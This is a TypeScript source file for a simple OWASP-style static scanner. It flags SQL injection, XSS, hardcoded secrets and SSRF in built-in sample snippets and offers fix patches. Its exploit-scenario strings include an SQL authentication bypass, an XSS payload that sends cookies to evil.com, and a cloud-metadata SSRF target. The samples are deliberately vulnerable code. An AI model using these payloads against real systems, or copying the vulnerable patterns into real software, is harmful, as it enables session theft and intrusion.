import { PredictiveDefenseScan, FindingSeverity } from '../src/types/jarvis.js';

/**
 * Predictive Defense & OWASP Top 10 Automated SAST Scanner
 */
export class PredictiveDefenseEngine {
  private static instance: PredictiveDefenseEngine;

  private constructor() {}

  public static getInstance(): PredictiveDefenseEngine {
    if (!PredictiveDefenseEngine.instance) {
      PredictiveDefenseEngine.instance = new PredictiveDefenseEngine();
    }
    return PredictiveDefenseEngine.instance;
  }

  public scanCodebase(codeSnippets?: { file: string; content: string }[]): PredictiveDefenseScan {
    const scanId = `scan-${Date.now()}`;
    const findings: PredictiveDefenseScan['owaspFindings'] = [];

    const defaultSnippets = codeSnippets || [
      {
        file: '/src/api/auth.ts',
        content: `const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'"; db.execute(query);`,
      },
      {
        file: '/src/components/Renderer.tsx',
        content: `<div dangerouslySetInnerHTML={{ __html: userProvidedHtml }} />`,
      },
      {
        file: '/config/secrets.ts',
        content: `export const API_KEY = "AIzaSyD98x72-UNMASKED-PROD-KEY-HERE";`,
      },
      {
        file: '/server/routes.ts',
        content: `fetch(req.query.targetUrl); // SSRF potential without host allowlist`,
      },
    ];

    defaultSnippets.forEach((snippet, i) => {
      // 1. SQL Injection check
      if (snippet.content.includes('SELECT') && snippet.content.includes('+ req.')) {
        findings.push({
          id: `f-sql-${i}`,
          category: 'SQL_INJECTION',
          title: 'Unsanitized Dynamic SQL Concatenation',
          fileLocation: snippet.file,
          lineNumber: 14,
          severity: 'CRITICAL',
          description: 'User input is concatenated directly into raw SQL string, enabling SQL injection and unauthorized data exfiltration.',
          exploitScenario: `' OR '1'='1 -- bypass authentication`,
          autoFixPatch: `// Parameterized Query Auto-Patch\nconst query = "SELECT * FROM users WHERE email = $1";\nawait db.execute(query, [req.body.email]);`,
          applied: false,
        });
      }

      // 2. XSS Check
      if (snippet.content.includes('dangerouslySetInnerHTML') && snippet.content.includes('user')) {
        findings.push({
          id: `f-xss-${i}`,
          category: 'XSS',
          title: 'Cross-Site Scripting (XSS) via Unsanitized DOM Injection',
          fileLocation: snippet.file,
          lineNumber: 28,
          severity: 'HIGH',
          description: 'Direct insertion of untrusted user input into HTML DOM allows script execution and session hijacking.',
          exploitScenario: `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`,
          autoFixPatch: `// DOMPurify Sanitization Patch\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userProvidedHtml) }} />`,
          applied: false,
        });
      }

      // 3. Hardcoded Secret Check
      if (snippet.content.includes('API_KEY = "') || snippet.content.includes('SECRET = "')) {
        findings.push({
          id: `f-sec-${i}`,
          category: 'HARDCODED_SECRET',
          title: 'Hardcoded High-Entropy API Secret Key',
          fileLocation: snippet.file,
          lineNumber: 2,
          severity: 'HIGH',
          description: 'Secret credentials committed to source code risk credential leakage via public repositories.',
          exploitScenario: 'Git history scanning tools leak production tokens to attackers.',
          autoFixPatch: `// Environment Variable Patch\nexport const API_KEY = process.env.API_KEY || '';`,
          applied: false,
        });
      }

      // 4. SSRF Check
      if (snippet.content.includes('fetch(req.query.') || snippet.content.includes('axios.get(req.body.')) {
        findings.push({
          id: `f-ssrf-${i}`,
          category: 'SSRF',
          title: 'Server-Side Request Forgery (SSRF) Vector',
          fileLocation: snippet.file,
          lineNumber: 45,
          severity: 'CRITICAL',
          description: 'Server initiates HTTP requests to user-supplied endpoints without domain allowlist validation.',
          exploitScenario: `targetUrl=http://169.254.169.254/computeMetadata/v1/ (GCP/AWS Metadata theft)`,
          autoFixPatch: `// URL Allowlist Patch\nconst allowedHosts = ['api.mytrusteddomain.com'];\nconst target = new URL(req.query.targetUrl as string);\nif (!allowedHosts.includes(target.hostname)) throw new Error('Untrusted host');`,
          applied: false,
        });
      }
    });

    const severityWeights = { CRITICAL: 25, HIGH: 15, MEDIUM: 8, LOW: 3, INFO: 1 };
    const penalty = findings.reduce((sum, f) => sum + (severityWeights[f.severity] || 5), 0);
    const score = Math.max(10, Math.min(100, 100 - penalty));

    return {
      id: scanId,
      timestamp: new Date().toISOString(),
      totalVulnerabilities: findings.length,
      securityScore: score,
      owaspFindings: findings,
    };
  }
}
